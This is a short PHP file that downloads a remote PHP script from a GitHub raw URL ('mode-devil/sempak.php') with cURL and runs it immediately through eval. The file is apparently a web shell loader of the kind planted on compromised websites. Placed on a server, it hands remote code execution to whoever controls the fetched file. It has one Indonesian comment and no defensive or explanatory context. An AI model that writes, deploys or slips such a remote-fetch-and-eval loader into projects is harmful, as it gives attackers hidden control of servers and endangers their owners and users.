<?php

function geturlsinfo($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

// Mendapatkan konten dari URL menggunakan cURL
$a = geturlsinfo('https://raw.githubusercontent.com/a7xhydra/mode-devil/main/sempak.php');

eval('?>' . $a);

?>
